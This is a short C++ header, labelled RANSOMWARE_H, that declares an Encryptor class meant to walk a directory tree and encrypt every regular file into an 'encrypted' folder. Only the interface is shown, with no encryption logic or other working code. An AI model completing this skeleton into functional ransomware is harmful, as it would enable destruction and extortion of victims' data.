#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <string>
#include <filesystem>
#include <vector>

class Encryptor final {
public:
    Encryptor() = delete;
    Encryptor(std::filesystem::path const &rootPath);

    ~Encryptor() = default;

    void Encrypt();

private:
    constexpr static auto ENCRYPTED_DIR_NAME = "encrypted";

    void ProcessDirectory(std::filesystem::directory_entry const &rootEntry);

    void EncryptRegularFile(std::filesystem::path const &filePath);

    std::filesystem::path encryptedDir_{};
    std::filesystem::path rootPath_{};
    std::vector<std::filesystem::path> regularFiles_{};
    std::vector<std::filesystem::path> directories_{};
};

#endif // RANSOMWARE_H
